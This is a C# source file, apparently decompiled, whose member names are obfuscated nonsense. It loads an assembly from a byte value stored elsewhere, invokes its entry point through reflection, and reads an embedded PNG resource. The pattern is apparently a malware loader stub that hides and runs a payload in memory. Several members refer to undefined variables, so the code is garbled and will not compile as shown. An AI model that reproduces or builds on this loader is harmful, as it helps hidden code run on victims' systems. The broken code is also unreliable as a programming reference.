using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Reflection;

public class SynchronousChannel1
{
	public static ImageFormat arizona = ImageFormat.get_Png();

	public static Assembly open = Assembly.Load(IncrementalReadDecoder.NameloadPluginsUnloadPlugin);

	public static MethodInfo mentry = Assembly.Load(IncrementalReadDecoder.NameloadPluginsUnloadPlugin).EntryPoint;

	public static object OnlineStateLoadDefaultsget_AllowedCaller => assembly.CreateInstance(SynchronousChannel1.get_StateMessageRunActionExecute(entryPoint));

	public static string StateMessageRunActionExecute => (string)SynchronousChannel1.get_Nameget_SteamIDProcessInternalLog((object)entryPoint);

	internal static object Nameget_SteamIDProcessInternalLog => ((MemberInfo)asm).Name;

	public static Image ConfigurationLoadDefaultsget_Summary
	{
		get
		{
			using (Stream stream = asm.GetManifestResourceStream("MarshalByRefObject.png"))
			{
				if (stream != null)
				{
					return Image.FromStream(stream);
				}
			}
			return null;
		}
	}

	public static void get_StateMessageGetCommandcheckTimerRestart(Assembly assembly, MethodInfo entryPoint)
	{
		entryPoint.Invoke(SynchronousChannel1.get_OnlineStateLoadDefaultsget_AllowedCaller(assembly, entryPoint), null);
	}

	public static void DeleteGroupExecute_003C_002Ector_003Eb__3_0()
	{
		IsUriAwakeGetPlugin();
	}

	internal static bool IsUriAwakeGetPlugin()
	{
		get_StateMessageGetCommandcheckTimerRestart(open, mentry);
		return true;
	}

	internal static bool GetOpenWindowsGetPermissionsRead()
	{
		return false;
	}
}
